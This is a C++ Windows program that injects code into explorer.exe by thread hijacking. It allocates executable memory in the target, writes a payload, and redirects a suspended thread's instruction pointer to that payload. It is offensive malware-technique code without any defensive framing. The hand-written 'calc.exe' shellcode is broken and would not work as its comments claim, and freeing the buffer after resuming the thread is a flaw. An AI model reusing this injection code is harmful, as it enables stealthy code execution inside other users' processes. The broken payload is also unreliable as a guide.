#include <windows.h>
#include <tlhelp32.h>
#include <iostream>

// Function to find the target process ID (PID) by name
DWORD FindProcessId(const std::string& processName) {
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) {
        std::cerr << "Failed to create process snapshot. Error: " << GetLastError() << std::endl;
        return 0;
    }

    PROCESSENTRY32 pe32;
    pe32.dwSize = sizeof(PROCESSENTRY32);

    if (Process32First(hSnapshot, &pe32)) {
        do {
            if (processName == pe32.szExeFile) {
                CloseHandle(hSnapshot);
                return pe32.th32ProcessID;
            }
        } while (Process32Next(hSnapshot, &pe32));
    }

    CloseHandle(hSnapshot);
    std::cerr << "Process not found." << std::endl;
    return 0;
}

// Function to perform thread hijacking for code injection
bool InjectThreadHijacking(DWORD targetProcessId, const char* payload, SIZE_T payloadSize) {
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, targetProcessId);
    if (!hProcess) {
        std::cerr << "Failed to open process. Error: " << GetLastError() << std::endl;
        return false;
    }

    // Allocate memory in the target process
    LPVOID remoteBuffer = VirtualAllocEx(hProcess, NULL, payloadSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!remoteBuffer) {
        std::cerr << "Failed to allocate memory in target process. Error: " << GetLastError() << std::endl;
        CloseHandle(hProcess);
        return false;
    }

    // Write payload to the allocated memory
    if (!WriteProcessMemory(hProcess, remoteBuffer, payload, payloadSize, NULL)) {
        std::cerr << "Failed to write payload to target process. Error: " << GetLastError() << std::endl;
        VirtualFreeEx(hProcess, remoteBuffer, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return false;
    }

    // Enumerate threads in the target process
    HANDLE hThreadSnap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
    if (hThreadSnap == INVALID_HANDLE_VALUE) {
        std::cerr << "Failed to create thread snapshot. Error: " << GetLastError() << std::endl;
        VirtualFreeEx(hProcess, remoteBuffer, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return false;
    }

    THREADENTRY32 te32;
    te32.dwSize = sizeof(THREADENTRY32);

    if (Thread32First(hThreadSnap, &te32)) {
        do {
            if (te32.th32OwnerProcessID == targetProcessId) {
                HANDLE hThread = OpenThread(THREAD_ALL_ACCESS, FALSE, te32.th32ThreadID);
                if (hThread) {
                    // Suspend the thread
                    SuspendThread(hThread);

                    // Get thread context
                    CONTEXT ctx;
                    ctx.ContextFlags = CONTEXT_CONTROL;
                    if (GetThreadContext(hThread, &ctx)) {
                        #ifdef _WIN64
                        ctx.Rip = (DWORD64)remoteBuffer; // For x64 systems
                        #else
                        ctx.Eip = (DWORD)remoteBuffer;   // For x86 systems
                        #endif

                        // Set thread context to point to the payload
                        if (!SetThreadContext(hThread, &ctx)) {
                            std::cerr << "Failed to set thread context. Error: " << GetLastError() << std::endl;
                        }

                        // Resume the thread
                        ResumeThread(hThread);
                        CloseHandle(hThread);
                        break; // Injection complete
                    } else {
                        std::cerr << "Failed to get thread context. Error: " << GetLastError() << std::endl;
                    }
                    CloseHandle(hThread);
                }
            }
        } while (Thread32Next(hThreadSnap, &te32));
    } else {
        std::cerr << "No threads found in the target process." << std::endl;
    }

    CloseHandle(hThreadSnap);
    VirtualFreeEx(hProcess, remoteBuffer, 0, MEM_RELEASE);
    CloseHandle(hProcess);

    return true;
}

int main() {
    // Create a simple payload that launches calc.exe
    const char payload[] = 
        "\x48\x31\xc0"                        // xor rax, rax
        "\x50"                                // push rax
        "\x48\x8d\x35\x04\x00\x00\x00"        // lea rsi, [rip+4]
        "\x48\x8d\x3d\x06\x00\x00\x00"        // lea rdi, [rip+6]
        "\x48\x8d\x15\x07\x00\x00\x00"        // lea rdx, [rip+7]
        "\x48\x83\xec\x20"                    // sub rsp, 0x20
        "\xff\xd7"                            // call rdi
        "\xc3"                                // ret
        "calc.exe";                           // Command to execute

    DWORD payloadSize = sizeof(payload);

    // Find a target process (e.g., explorer.exe)
    DWORD targetPID = FindProcessId("explorer.exe");
    if (targetPID == 0) {
        std::cerr << "Target process not found." << std::endl;
        return 1;
    }

    // Inject the payload into the target process
    if (InjectThreadHijacking(targetPID, payload, payloadSize)) {
        std::cout << "Injection succeeded!" << std::endl;
    } else {
        std::cerr << "Injection failed." << std::endl;
    }

    return 0;
}
